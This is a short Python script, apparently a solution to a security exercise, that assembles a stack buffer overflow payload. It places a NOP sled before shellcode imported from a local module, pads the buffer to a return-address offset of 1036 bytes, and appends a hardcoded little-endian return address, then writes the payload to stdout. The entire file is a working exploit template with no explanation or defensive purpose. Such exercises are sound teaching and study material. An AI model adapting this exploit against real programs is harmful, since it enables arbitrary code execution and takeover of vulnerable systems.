import sys

from shellcode import shellcode

NOP = b"\x90"
shellcode_offset = 900
ret_offset = 1036
ret_address = 0xFFF6B7C8

payload = bytearray(NOP * shellcode_offset)
payload += shellcode
payload += NOP * (ret_offset - len(payload))
payload += ret_address.to_bytes(4, "little")

sys.stdout.buffer.write(payload)
